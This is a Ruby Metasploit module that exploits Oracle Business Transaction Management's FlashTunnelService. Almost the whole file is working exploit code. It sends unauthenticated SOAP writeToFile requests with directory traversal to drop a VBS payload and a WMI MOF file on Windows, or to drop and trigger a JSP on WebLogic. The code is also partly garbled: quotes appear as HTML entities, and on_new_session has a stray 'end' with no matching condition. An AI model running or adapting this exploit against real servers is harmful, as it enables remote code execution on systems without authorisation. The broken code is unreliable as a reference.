# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle Business Transaction Management FlashTunnelService Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits abuses the FlashTunnelService SOAP web service on Oracle
        Business Transaction Management 12.1.0.7 to upload arbitrary files, without
        authentication, using the WriteToFile method. The same method contains a directory
        traversal vulnerability, which allows to upload the files to arbitrary locations.

        In order to execute remote code two techniques are provided. If the Oracle app has
        been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web
        root. If a new Domain has been used to deploy the Oracle application, the Windows
        Management Instrumentation service can be used to execute arbitrary code.

        Both techniques has been successfully tested on default installs of Oracle BTM
        12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are
        provided, but the user can configure the traversal depth using the DEPTH option.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability Discovery and PoC
          &#039;sinn3r&#039;, # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;85087&#039; ],
          [ &#039;BID&#039;, &#039;54839&#039; ],
          [ &#039;EDB&#039;, &#039;20318&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 5
        },
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;           => 2048,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => [ &#039;java&#039;, &#039;win&#039; ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Oracle BTM 12.1.0.7 / Weblogic 12.1.1 with Samples Domain / Java&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Depth&#039; => 10
            },
          ],
          [ &#039;Oracle BTM 12.1.0.7 / Windows 2003 SP2 through WMI&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Depth&#039; => 13
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 07 2012&#039;))

    register_options(
      [
        Opt::RPORT(7001),
        OptInt.new(&#039;DEPTH&#039;, [false, &#039;Traversal depth&#039;])
      ], self.class)
  end

  def on_new_session(client)

    return if not @var_mof_name
    return if not @var_vbs_name

      print_error("The vbs payload (C:\\windows\\system32\\#{@var_vbs_name}.vbs) and mof file (C:\\windows\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof) must be removed manually.")
      return
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    cmd = "C:\\windows\\system32\\attrib.exe -r " +
          "C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"

    client.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true })

    begin
      print_status("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
      client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
      print_status("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
      client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
    end

  end

  def exploit

    peer = "#{rhost}:#{rport}"

    if target.name =~ /WMI/

      # In order to save binary data to the file system the payload is written to a .vbs
      # file and execute it from there.
      @var_mof_name = rand_text_alpha(rand(5)+5)
      @var_vbs_name = rand_text_alpha(rand(5)+5)

      print_status("Encoding payload into vbs...")
      my_payload = generate_payload_exe
      vbs_content = Msf::Util::EXE.to_exe_vbs(my_payload)

      print_status("Generating mof file...")
      mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

      if not datastore[&#039;DEPTH&#039;] or datastore[&#039;DEPTH&#039;] == 0
        traversal = "..\\" * target[&#039;Depth&#039;]
      else
        traversal = "..\\" * datastore[&#039;DEPTH&#039;]
      end
      traversal << "WINDOWS\\system32\\#{@var_vbs_name}.vbs"

      print_status("#{peer} - Uploading the VBS payload")

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(vbs_content)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      res = send_request_cgi(
        {
          &#039;uri&#039;        => &#039;/btmui/soa/flash_svc/&#039;,
          &#039;version&#039;    => &#039;1.1&#039;,
          &#039;method&#039;     => &#039;POST&#039;,
          &#039;ctype&#039;      => "text/xml;charset=UTF-8",
          &#039;SOAPAction&#039; => "\"http://soa.amberpoint.com/writeToFile\"",
          &#039;data&#039;       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - VBS payload successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the VBS payload")
        return
      end

      if not datastore[&#039;DEPTH&#039;] or datastore[&#039;DEPTH&#039;] == 0
        traversal = "..\\" * target[&#039;Depth&#039;]
      else
        traversal = "..\\" * datastore[&#039;DEPTH&#039;]
      end
      traversal << "WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof"

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(mof_content)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      print_status("#{peer} - Uploading the MOF file")

      res = send_request_cgi(
        {
          &#039;uri&#039;        => &#039;/btmui/soa/flash_svc/&#039;,
          &#039;version&#039;    => &#039;1.1&#039;,
          &#039;method&#039;     => &#039;POST&#039;,
          &#039;ctype&#039;      => "text/xml;charset=UTF-8",
          &#039;SOAPAction&#039; => "\"http://soa.amberpoint.com/writeToFile\"",
          &#039;data&#039;       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - MOF file successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the MOF file")
        return
      end

    elsif target[&#039;Arch&#039;] == ARCH_JAVA

      @jsp_name = rand_text_alpha(rand(5)+5)

      if not datastore[&#039;DEPTH&#039;] or datastore[&#039;DEPTH&#039;] == 0
        traversal = "..\\" * target[&#039;Depth&#039;]
      else
        traversal = "..\\" * datastore[&#039;DEPTH&#039;]
      end
      traversal << "\\server\\examples\\build\\mainWebApp\\#{@jsp_name}.jsp"

      print_status("#{peer} - Uploading the JSP payload")

      soap_request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
      soap_request << "xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" "
      soap_request << "xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">"
      soap_request << "  <soapenv:Header/>"
      soap_request << "  <soapenv:Body>"
      soap_request << "    <int:writeToFileRequest>"
      soap_request << "      <int:writeToFile handle=\"#{traversal}\">"
      soap_request << "        <typ:text>#{Rex::Text.html_encode(payload.encoded)}</typ:text>"
      soap_request << "        <typ:WriteToFileRequestVersion>"
      soap_request << "        </typ:WriteToFileRequestVersion>"
      soap_request << "      </int:writeToFile>"
      soap_request << "    </int:writeToFileRequest>"
      soap_request << "  </soapenv:Body>"
      soap_request << "</soapenv:Envelope>"

      res = send_request_cgi(
        {
          &#039;uri&#039;        => &#039;/btmui/soa/flash_svc/&#039;,
          &#039;version&#039;    => &#039;1.1&#039;,
          &#039;method&#039;     => &#039;POST&#039;,
          &#039;ctype&#039;      => "text/xml;charset=UTF-8",
          &#039;SOAPAction&#039; => "\"http://soa.amberpoint.com/writeToFile\"",
          &#039;data&#039;       => soap_request,
        }, 5)

      if res and res.code == 200 and res.body =~ /writeToFileResponse/
        print_status("#{peer} - JSP payload successfully uploaded")
      else
        print_error("#{peer} - Failed to upload the JSP payload")
        return
      end

      print_status("#{peer} - Executing the uploaded JSP #{@jsp_name}.jsp ...")
      res = send_request_cgi(
        {
          &#039;uri&#039;        => "/#{@jsp_name}.jsp",
          &#039;version&#039;    => &#039;1.1&#039;,
          &#039;method&#039;     => &#039;GET&#039;,
        }, 5)

    end

  end

end



